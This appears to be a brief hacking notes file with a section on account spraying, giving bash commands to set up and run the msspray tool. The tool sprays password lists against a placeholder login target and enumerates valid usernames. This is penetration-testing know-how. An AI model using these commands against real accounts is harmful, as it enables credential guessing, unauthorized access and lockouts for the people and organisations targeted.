# Hacking

## Enumeration

### Account spray

https://github.com/0xZDH/msspray

```bash
pip3 install selenium
wget https://github.com/mozilla/geckodriver/releases/download/v0.26.0/geckodriver-v0.26.0-linux64.tar.gz
tar -xvf geckodriver-v0.26.0-linux64.tar.gz
export PATH=$PATH:$(pwd) # Add the current directory with the geckodriver to the PATH

# password spray
python3 msspray.py -t https://<target website> -u usernames.txt -p passwords.txt --count 2 --lockout 5 --verbose

# user enum
python3 msspray.py -t https://<target website> -u usernames.txt -e --verbose
```
